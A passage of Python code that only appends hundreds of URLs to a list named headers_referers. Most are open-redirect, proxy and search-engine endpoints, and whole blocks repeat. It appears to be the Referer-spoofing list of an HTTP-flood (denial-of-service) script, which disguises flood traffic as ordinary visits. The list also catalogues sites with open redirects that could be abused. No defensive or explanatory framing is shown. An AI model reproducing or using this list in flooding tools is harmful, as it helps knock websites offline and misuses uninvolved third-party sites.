	headers_referers.append('http://www.dandelionradio.com/go.php?url=')
	headers_referers.append('http://www.go.php-fusion-iran.com/go.php?url=')
	headers_referers.append('http://helpful-information.com/relationships/go.php?url=')
	headers_referers.append('http://www.health.omskinform.ru/go.php?url=')
	headers_referers.append('http://www.eitforum.com/go.php?url=')
	headers_referers.append('http://ipove.info/go.php?url=')
	headers_referers.append('http://www.treasure-vacations.com/go.php?url=')
	headers_referers.append('http://www.deutsche-krieger.de/go.php?url=')
	headers_referers.append('http://rusbody.com/go.php?url=')
	headers_referers.append('http://www.bonsai-for-beginners.com/go.php?url=')
	headers_referers.append('http://twitnow.ru/go.php?url=')
	headers_referers.append('http://www.1300dental.com.au/go.php?url=')
	headers_referers.append('http://engelcosmetology.kiev.ua/go.php?url=')
	headers_referers.append('http://vps.cohenrisk.com/~xoxohth/go.php?url=')
	headers_referers.append('http://valaholeuropaban.uw.hu/guestbook/go.php?url=')
	headers_referers.append('http://enrique-iglesias.net/guestbook/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.find-a-car.info/go.php?url=')
	headers_referers.append('http://snowcore.net/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://www.1300franchises.com/go.php?url=')
	headers_referers.append('http://www.information-guru.com/book-marketing/go.php?url=')
	headers_referers.append('http://www.boxingscene.com/weight-loss/go.php?url=')
	headers_referers.append('http://www.ninja-thailand.com/go.php?url=')
	headers_referers.append('http://shack.ir/go.php?url=')
	headers_referers.append('http://www.quelsoft.com/go.php?url=')
	headers_referers.append('http://www.jonko.eu/tools/hide_referrer/go.php?url=')
	headers_referers.append('http://lj.hangye5.com/go.php?url=')
	headers_referers.append('http://www.lightningring.com/guestbook/go.php?url=')
	headers_referers.append('http://www.1300directory.com.au/go.php?url=')
	headers_referers.append('http://www.litinvest.com/catalog/go.php?url=')
	headers_referers.append('http://www.1300clothing.com.au/go.php?url=')
	headers_referers.append('http://verkehrshaus.org/go.php?url=')
	headers_referers.append('http://www.xohth.com/beta/go.php?url=')
	headers_referers.append('http://auctionsinfo.net76.net/go.php?url=')
	headers_referers.append('http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=')
	headers_referers.append('http://www.1300dentist.com.au/go.php?url=')
	headers_referers.append('http://www.forodeprogramas.com/go.php?url=')
	headers_referers.append('http://thatware.org/go.php?url=')
	headers_referers.append('http://www.star.lu/go.php?url=')
	headers_referers.append('http://www.dailytechinfo.org/go.php?url=')
	headers_referers.append('http://m-bizportal.ru/go.php?url=')
	headers_referers.append('http://geostats2004.com/go.php?url=')
	headers_referers.append('http://shopdazzles.com/guestbook/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://www.1800dental.com.au/go.php?url=')
	headers_referers.append('http://www.flappen.nl/gb/go.php?url=')
	headers_referers.append('http://webmasterplus.us/go/go.php?url=')
	headers_referers.append('http://www.sportzone.ru/go.php?url=')
	headers_referers.append('http://kuzen.ru/go.php?url=')
	headers_referers.append('http://1300dating.com.au/go.php?url=')
	headers_referers.append('http://kinoamator.ru/go.php?url=')
	headers_referers.append('http://autoqa.org/go.php?url=')
	headers_referers.append('http://1300agents.com.au/go.php?url=')
	headers_referers.append('http://depressionclub.awardspace.com/go.php?url=')
	headers_referers.append('http://www.1300lifestyle.com.au/go.php?url=')
	headers_referers.append('http://www.onlinegratis.tv/go.php?url=')
	headers_referers.append('http://7days.kiev.ua/go.php?url=')
	headers_referers.append('http://www.jenteporten.no/go.php?url=')
	headers_referers.append('http://www.recipes.portalnews.de/go.php?url=')
	headers_referers.append('http://www.infogine.com/articles/aerobics-cardio/go.php?url=')
	headers_referers.append('http://13auto.com.au/go.php?url=')
	headers_referers.append('http://www.socialgrid.com/go.php?url=')
	headers_referers.append('http://www.spaleon.de/go.php?url=')
	headers_referers.append('http://waptrochoi.net/go.php?url=')
	headers_referers.append('http://www.ai.rug.nl/~doesburg/gbook/go.php?url=')
	headers_referers.append('http://www.keralaclick.com/photography/go.php?url=')
	headers_referers.append('http://kormoranfolk.hu/guestbook/go.php?url=')
	headers_referers.append('http://sidlogic.com/content/recipes/go.php?url=')
	headers_referers.append('http://www.languageisavirus.com/articles/writing/language/go.php?url=')
	headers_referers.append('http://2013toyotacorolla.com/go.php?url=')
	headers_referers.append('http://customerserviceauthority.com/go.php?url=')
	headers_referers.append('http://www.beautytipsadvice.infoslobber.com/go.php?url=')
	headers_referers.append('http://www.tripdirect.com/go.php?url=')
	headers_referers.append('http://spiritual-link.com/go.php?url=')
	headers_referers.append('http://learningresource.info/hair-loss-and-thinning/go.php?url=')
	headers_referers.append('http://www.backpacker.no/go.php?url=')
	headers_referers.append('http://aff.apk4fun.com/go.php?url=')
	headers_referers.append('http://www.totalwars.ru/go.php?url=')
	headers_referers.append('http://www.fediea.org/go.php?url=')
	headers_referers.append('http://articles.pointshop.com/college/go.php?url=')
	headers_referers.append('http://mcpe.tw/go.php?url=')
	headers_referers.append('http://www.qosmo.com/go.php?url=')
	headers_referers.append('http://www.alopa.com/go.php?url=')
	headers_referers.append('http://coreychang.net/gbook/go.php?url=')
	headers_referers.append('http://www.1001topwords.com/marketing1/marketing/go.php?url=')
	headers_referers.append('http://www.bait-tackle.com/go.php?url=')
	headers_referers.append('http://monkeezemarketing.com/go.php?url=')
	headers_referers.append('http://www.lincolnhsbrooklyn.com/go.php?url=')
	headers_referers.append('http://healthwebsitebusinesses.com/demo/diabetes/go.php?url=')
	headers_referers.append('http://ww3.myonlinestats.com/go/go.php?url=')
	headers_referers.append('http://www.wmhs.com/newmobile/redirect.php?page=')
	headers_referers.append('http://www.szene-drinks.com/redirect.php?page=')
	headers_referers.append('http://www.swzundert.nl/redirect.php?page=')
	headers_referers.append('http://www.denbreems.nl/redirect.php?page=')
	headers_referers.append('http://www.flohmarkt.ch/redirect.php?page=')
	headers_referers.append('http://www.erhvervscentrum.dk/redirect.php?page=')
	headers_referers.append('http://www.netintellgames.com/redirect.php?page=')
	headers_referers.append('http://www.pia.org/IRC/qs/redirect.php?page=')
	headers_referers.append('http://www.pcpros-tx.com/php/redirect.php?page=')
	headers_referers.append('http://www.allencapital.com/redirect.php?page=')
	headers_referers.append('http://www.taosadultbasketballleague.com/redirect.php?page=')
	headers_referers.append('http://taosadultbasketball.com/redirect.php?page=')
	headers_referers.append('http://www.graphisoftus.com/redirect.php?page=')
	headers_referers.append('http://purificato.org/rawlab/redirect.php?page=')
	headers_referers.append('http://www.anglobelge.com/EN/splash-page/redirect.php?page=')
	headers_referers.append('http://tzf.free.fr/redirect.php?page=')
	headers_referers.append('http://www.tandem-club.org.uk/files/public_html/redirect.php?page=')
	headers_referers.append('http://rawlab.mindcreations.com/redirect.php?page=')
	headers_referers.append('http://www.hxtrack.com/redirect.php?page=')
	headers_referers.append('http://signaturesx.com/redirect.php?page=')
	headers_referers.append('http://www.fsds.sanmarinoscacchi.sm/gotoURL.asp?url=')
	headers_referers.append('http://www.niemannpick.org/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.pillole.org/public/aspnuke/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.quiere-t.net/gotoURL.asp?url=')
	headers_referers.append('http://www.pocoserio.com/gotoURL.asp?url=')
	headers_referers.append('http://win.aiafa.it/gotoURL.asp?url=')
	headers_referers.append('http://www.centromorin.it/aspnuke207/gotoURL.asp?url=')
	headers_referers.append('http://www.asim.it/public/gotoURL.asp?url=')
	headers_referers.append('http://www.straz.bialapodlaska.pl/km/gotoURL.asp?url=')
	headers_referers.append('http://www.beatote.com/gotoURL.asp?url=')
	headers_referers.append('http://www.monteargentario.it/gotoURL.asp?url=')
	headers_referers.append('http://www.trasporti.marche.it/nuke/gotoURL.asp?url=')
	headers_referers.append('http://www.elparadise.com/gotoURL.asp?url=')
	headers_referers.append('http://www.chiauci-webforum.it/gotoURL.asp?url=')
	headers_referers.append('http://www.icfpet.it/gotoURL.asp?url=')
	headers_referers.append('http://www.dgtale.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aspnuke.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aicritalia.org/gotoURL.asp?url=')
	headers_referers.append('http://www.viggiu-in-rete.org/newsite/gotoURL.asp?url=')
	headers_referers.append('http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=')
	headers_referers.append('http://www.dffyw.com/dir/gotourl.asp?url=')
	headers_referers.append('http://www.mentalism.it/gotoURL.asp?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
	headers_referers.append('http://www.golfclubambrosiano.it/gotoURL.asp?url=')
	headers_referers.append('http://resuite.upg.it/gotoURL.asp?url=')
	headers_referers.append('http://www.cgqd.com/shop/it/gotourl.asp?url=')
	headers_referers.append('http://www.unicyclist.it/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.idealdieta.it/gotoURL.asp?url=')
	headers_referers.append('https://www.google.pl/interstitial?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.heatwalkingcycling.org/index.php?pg=')
	headers_referers.append('http://fresno.steinwaydealer.com/index.php?go=')
	headers_referers.append('http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=')
	headers_referers.append('http://www.karplaw.com/index.php?go=')
	headers_referers.append('http://www.veithsymposium.org/index.php?pg=')
	headers_referers.append('http://www.zikgu.info/search.php?go=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://abcnews.go.com/?page=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=')
	headers_referers.append('http://www.webmd.com/lung/tc/acute-bronchitis-topic-overview?page=')
	headers_referers.append('http://www.benefitmall.com/?TabID=36&emailurl=')
	headers_referers.append('http://www.tolerance.org/?source=redirect&url=teachingtolerance?url=')
	headers_referers.append('http://www.accuride.co.jp/cgi/check.cgi?url=')
	headers_referers.append('http://www.caafcgilsicilia.it/?id_pagina=')
	headers_referers.append('http://www.professioni24.ilsole24ore.com/?page=')
	headers_referers.append('http://italia.virgilio.it/?ckset=force&amp;cityRedirect=falseredirect=')
	headers_referers.append('http://oknabm.ru/index.php?pg=')
	headers_referers.append('http://www.thrombosis2016.org/index.php?go=')
	headers_referers.append('http://www.gotm.net/index.php?go=')
	headers_referers.append('http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=')
	headers_referers.append('http://david.bach.profesores.ie.edu/?profesor=david.bach&pagina=')
	headers_referers.append('http://javier.carrillo.profesores.ie.edu/?profesor=javier.carrillo&pagina=')
	headers_referers.append('http://www.fabrizio.salvador.profesores.ie.edu/?profesor=fabrizio.salvador&pagina=')
	headers_referers.append('http://manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://efernandez-cantelli.profesores.ie.edu/?profesor=efernandez-cantelli&pagina=')
	headers_referers.append('http://www.manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://www.marvin.com/?page=')
	headers_referers.append('http://www.ivrr.de/proxy.php?url=')
	headers_referers.append('http://validator.w3.org/checklink?uri=')
	headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
	headers_referers.append('http://evoec.com/review/redirect.php?url=')
	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
	headers_referers.append('http://apke.ru/redirect.php?url=')
	headers_referers.append('http://seodrum.com/redirect.php?url=')
	headers_referers.append('http://redrool.com/redirect.php?url=')
	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
	headers_referers.append('http://searchtoday.info/redirect.php?url=')
	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
	headers_referers.append('http://palinstravels.co.uk/redirect.php?url=')
	headers_referers.append('http://www.phuketbranches.com/admin/redirect.php?url=')
	headers_referers.append('http://tools.strugacreative.com/redirect.php?url=')
	headers_referers.append('http://www.elec-intro.com/redirect.php?url=')
	headers_referers.append('http://maybeit.net/redirect.php?url=')
	headers_referers.append('http://www.usgpru.net/redirect.php?url=')
	headers_referers.append('http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=')
	headers_referers.append('http://www.webaverage.com/redirect.php?url=')
	headers_referers.append('http://www.seorehash.com/redirect.php?url=')
	headers_referers.append('http://www.seo.khabarsaz.net/redirect.php?url=')
	headers_referers.append('http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=')
	headers_referers.append('http://www.informeseogratis.com/redirect.php?url=')
	headers_referers.append('http://www.websites-canada.com/redirect.php?url=')
	headers_referers.append('http://zakaztovarov.net/redirect.php?url=')
	headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
	headers_referers.append('http://www.marumura.com/redirect.php?url=')
	headers_referers.append('http://old.leginet.eu/redirect.php?url=')
	headers_referers.append('http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=')
	headers_referers.append('http://www.tuangou.do/proxy.php?url=')
	headers_referers.append('http://www.gvpl.ca/url/proxy.php?url=')
	headers_referers.append('http://weiter-lesen.net/web/proxy.php?url=')
	headers_referers.append('http://soroka-vorovka.com/proxy/proxy.php?url=')
	headers_referers.append('http://www.cogsci.ed.ac.uk/~richard/xml-check.cgi?url=')
	headers_referers.append('http://pro.athealth.co.jp/cgi-bin/pro/check.cgi?url=')
	headers_referers.append('http://ukrhome.net/go.php?url=')
	headers_referers.append('http://www.aliancaandroid.com/go.php?url=')
	headers_referers.append('http://www.hangglider.kiev.ua/go.php?url=')
	headers_referers.append('http://it4pal.com/ar/go.php?url=')
	headers_referers.append('http://paperplane.su/go.php?url=')
	headers_referers.append('http://www.education.net.au/go.php?url=')
	headers_referers.append('http://www.bloggerexp.com/go.php?url=')
	headers_referers.append('http://www.lifetype.ru/go.php?url=')
	headers_referers.append('http://blogerator.ru/go.php?url=')
	headers_referers.append('http://www.hella.ru/go.php?url=')
	headers_referers.append('http://fcmanutd.com/go.php?url=')
	headers_referers.append('http://www.sitysoft.com/go.php?url=')
	headers_referers.append('https://www.google.com/interstitial?url=')
	headers_referers.append('http://www.flashreport.org/blog/go.php?url=')
	headers_referers.append('http://www.otworld.de/go.php?url=')
	headers_referers.append('http://www.ennk.ru/go.php?url=')
	headers_referers.append('http://www.xoxohth.com/go.php?url=')
	headers_referers.append('http://dochtm.com/go.php?url=')
	headers_referers.append('http://www.autoadmit.com/go.php?url=')
	headers_referers.append('http://www.vttour.fr/actu/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://baanna.net/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://www.webchirkut.com/go.php?url=')
	headers_referers.append('http://www.parkcity.org/redirect.aspx?url=')
	headers_referers.append('http://hao.zw51.cn/go.php?url=')
	headers_referers.append('http://dmoz.by/go.php?url=')
	headers_referers.append('http://www.dandelionradio.com/go.php?url=')
	headers_referers.append('http://www.go.php-fusion-iran.com/go.php?url=')
	headers_referers.append('http://helpful-information.com/relationships/go.php?url=')
	headers_referers.append('http://www.health.omskinform.ru/go.php?url=')
	headers_referers.append('http://www.eitforum.com/go.php?url=')
	headers_referers.append('http://ipove.info/go.php?url=')
	headers_referers.append('http://www.treasure-vacations.com/go.php?url=')
	headers_referers.append('http://www.deutsche-krieger.de/go.php?url=')
	headers_referers.append('http://rusbody.com/go.php?url=')
	headers_referers.append('http://www.bonsai-for-beginners.com/go.php?url=')
	headers_referers.append('http://twitnow.ru/go.php?url=')
	headers_referers.append('http://www.1300dental.com.au/go.php?url=')
	headers_referers.append('http://engelcosmetology.kiev.ua/go.php?url=')
	headers_referers.append('http://vps.cohenrisk.com/~xoxohth/go.php?url=')
	headers_referers.append('http://valaholeuropaban.uw.hu/guestbook/go.php?url=')
	headers_referers.append('http://enrique-iglesias.net/guestbook/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.find-a-car.info/go.php?url=')
	headers_referers.append('http://snowcore.net/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://www.1300franchises.com/go.php?url=')
	headers_referers.append('http://www.information-guru.com/book-marketing/go.php?url=')
	headers_referers.append('http://www.boxingscene.com/weight-loss/go.php?url=')
	headers_referers.append('http://www.ninja-thailand.com/go.php?url=')
	headers_referers.append('http://shack.ir/go.php?url=')
	headers_referers.append('http://www.quelsoft.com/go.php?url=')
	headers_referers.append('http://www.jonko.eu/tools/hide_referrer/go.php?url=')
	headers_referers.append('http://lj.hangye5.com/go.php?url=')
	headers_referers.append('http://www.lightningring.com/guestbook/go.php?url=')
	headers_referers.append('http://www.1300directory.com.au/go.php?url=')
	headers_referers.append('http://www.litinvest.com/catalog/go.php?url=')
	headers_referers.append('http://www.1300clothing.com.au/go.php?url=')
	headers_referers.append('http://verkehrshaus.org/go.php?url=')
	headers_referers.append('http://www.xohth.com/beta/go.php?url=')
	headers_referers.append('http://auctionsinfo.net76.net/go.php?url=')
	headers_referers.append('http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=')
	headers_referers.append('http://www.1300dentist.com.au/go.php?url=')
	headers_referers.append('http://www.forodeprogramas.com/go.php?url=')
	headers_referers.append('http://thatware.org/go.php?url=')
	headers_referers.append('http://www.star.lu/go.php?url=')
	headers_referers.append('http://www.dailytechinfo.org/go.php?url=')
	headers_referers.append('http://m-bizportal.ru/go.php?url=')
	headers_referers.append('http://geostats2004.com/go.php?url=')
	headers_referers.append('http://shopdazzles.com/guestbook/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://www.1800dental.com.au/go.php?url=')
	headers_referers.append('http://www.flappen.nl/gb/go.php?url=')
	headers_referers.append('http://webmasterplus.us/go/go.php?url=')
	headers_referers.append('http://www.sportzone.ru/go.php?url=')
	headers_referers.append('http://kuzen.ru/go.php?url=')
	headers_referers.append('http://1300dating.com.au/go.php?url=')
	headers_referers.append('http://kinoamator.ru/go.php?url=')
	headers_referers.append('http://autoqa.org/go.php?url=')
	headers_referers.append('http://1300agents.com.au/go.php?url=')
	headers_referers.append('http://depressionclub.awardspace.com/go.php?url=')
	headers_referers.append('http://www.1300lifestyle.com.au/go.php?url=')
	headers_referers.append('http://www.onlinegratis.tv/go.php?url=')
	headers_referers.append('http://7days.kiev.ua/go.php?url=')
	headers_referers.append('http://www.jenteporten.no/go.php?url=')
	headers_referers.append('http://www.recipes.portalnews.de/go.php?url=')
	headers_referers.append('http://www.infogine.com/articles/aerobics-cardio/go.php?url=')
	headers_referers.append('http://13auto.com.au/go.php?url=')
	headers_referers.append('http://www.socialgrid.com/go.php?url=')
	headers_referers.append('http://www.spaleon.de/go.php?url=')
	headers_referers.append('http://waptrochoi.net/go.php?url=')
	headers_referers.append('http://www.ai.rug.nl/~doesburg/gbook/go.php?url=')
	headers_referers.append('http://www.keralaclick.com/photography/go.php?url=')
	headers_referers.append('http://kormoranfolk.hu/guestbook/go.php?url=')
	headers_referers.append('http://sidlogic.com/content/recipes/go.php?url=')
	headers_referers.append('http://www.languageisavirus.com/articles/writing/language/go.php?url=')
	headers_referers.append('http://2013toyotacorolla.com/go.php?url=')
	headers_referers.append('http://customerserviceauthority.com/go.php?url=')
	headers_referers.append('http://www.beautytipsadvice.infoslobber.com/go.php?url=')
	headers_referers.append('http://www.tripdirect.com/go.php?url=')
	headers_referers.append('http://spiritual-link.com/go.php?url=')
	headers_referers.append('http://learningresource.info/hair-loss-and-thinning/go.php?url=')
	headers_referers.append('http://www.backpacker.no/go.php?url=')
	headers_referers.append('http://aff.apk4fun.com/go.php?url=')
	headers_referers.append('http://www.totalwars.ru/go.php?url=')
	headers_referers.append('http://www.fediea.org/go.php?url=')
	headers_referers.append('http://articles.pointshop.com/college/go.php?url=')
	headers_referers.append('http://mcpe.tw/go.php?url=')
	headers_referers.append('http://www.qosmo.com/go.php?url=')
	headers_referers.append('http://www.alopa.com/go.php?url=')
	headers_referers.append('http://coreychang.net/gbook/go.php?url=')
	headers_referers.append('http://www.1001topwords.com/marketing1/marketing/go.php?url=')
	headers_referers.append('http://www.bait-tackle.com/go.php?url=')
	headers_referers.append('http://monkeezemarketing.com/go.php?url=')
	headers_referers.append('http://www.lincolnhsbrooklyn.com/go.php?url=')
	headers_referers.append('http://healthwebsitebusinesses.com/demo/diabetes/go.php?url=')
	headers_referers.append('http://ww3.myonlinestats.com/go/go.php?url=')
	headers_referers.append('http://www.wmhs.com/newmobile/redirect.php?page=')
	headers_referers.append('http://www.szene-drinks.com/redirect.php?page=')
	headers_referers.append('http://www.swzundert.nl/redirect.php?page=')
	headers_referers.append('http://www.denbreems.nl/redirect.php?page=')
	headers_referers.append('http://www.flohmarkt.ch/redirect.php?page=')
	headers_referers.append('http://www.erhvervscentrum.dk/redirect.php?page=')
	headers_referers.append('http://www.netintellgames.com/redirect.php?page=')
	headers_referers.append('http://www.pia.org/IRC/qs/redirect.php?page=')
	headers_referers.append('http://www.pcpros-tx.com/php/redirect.php?page=')
	headers_referers.append('http://www.allencapital.com/redirect.php?page=')
	headers_referers.append('http://www.taosadultbasketballleague.com/redirect.php?page=')
	headers_referers.append('http://taosadultbasketball.com/redirect.php?page=')
	headers_referers.append('http://www.graphisoftus.com/redirect.php?page=')
	headers_referers.append('http://purificato.org/rawlab/redirect.php?page=')
	headers_referers.append('http://www.anglobelge.com/EN/splash-page/redirect.php?page=')
	headers_referers.append('http://tzf.free.fr/redirect.php?page=')
	headers_referers.append('http://www.tandem-club.org.uk/files/public_html/redirect.php?page=')
	headers_referers.append('http://rawlab.mindcreations.com/redirect.php?page=')
	headers_referers.append('http://www.hxtrack.com/redirect.php?page=')
	headers_referers.append('http://signaturesx.com/redirect.php?page=')
	headers_referers.append('http://www.fsds.sanmarinoscacchi.sm/gotoURL.asp?url=')
	headers_referers.append('http://www.niemannpick.org/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.pillole.org/public/aspnuke/gotoURL.asp?url=')
	headers_referers.append('http://trasparenza.atpsassari.it/gotoURL.asp?url=')
	headers_referers.append('http://www.vespaclubportogruaro.it/gotoURL.asp?url=')
	headers_referers.append('http://www.quiere-t.net/gotoURL.asp?url=')
	headers_referers.append('http://www.pocoserio.com/gotoURL.asp?url=')
	headers_referers.append('http://win.aiafa.it/gotoURL.asp?url=')
	headers_referers.append('http://www.centromorin.it/aspnuke207/gotoURL.asp?url=')
	headers_referers.append('http://www.asim.it/public/gotoURL.asp?url=')
	headers_referers.append('http://www.straz.bialapodlaska.pl/km/gotoURL.asp?url=')
	headers_referers.append('http://www.beatote.com/gotoURL.asp?url=')
	headers_referers.append('http://www.monteargentario.it/gotoURL.asp?url=')
	headers_referers.append('http://www.trasporti.marche.it/nuke/gotoURL.asp?url=')
	headers_referers.append('http://www.elparadise.com/gotoURL.asp?url=')
	headers_referers.append('http://www.chiauci-webforum.it/gotoURL.asp?url=')
	headers_referers.append('http://www.icfpet.it/gotoURL.asp?url=')
	headers_referers.append('http://www.dgtale.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aspnuke.it/gotoURL.asp?url=')
	headers_referers.append('http://www.aicritalia.org/gotoURL.asp?url=')
	headers_referers.append('http://www.viggiu-in-rete.org/newsite/gotoURL.asp?url=')
	headers_referers.append('http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=')
	headers_referers.append('http://www.dffyw.com/dir/gotourl.asp?url=')
	headers_referers.append('http://www.mentalism.it/gotoURL.asp?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
	headers_referers.append('http://www.golfclubambrosiano.it/gotoURL.asp?url=')
	headers_referers.append('http://resuite.upg.it/gotoURL.asp?url=')
	headers_referers.append('http://www.cgqd.com/shop/it/gotourl.asp?url=')
	headers_referers.append('http://www.unicyclist.it/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
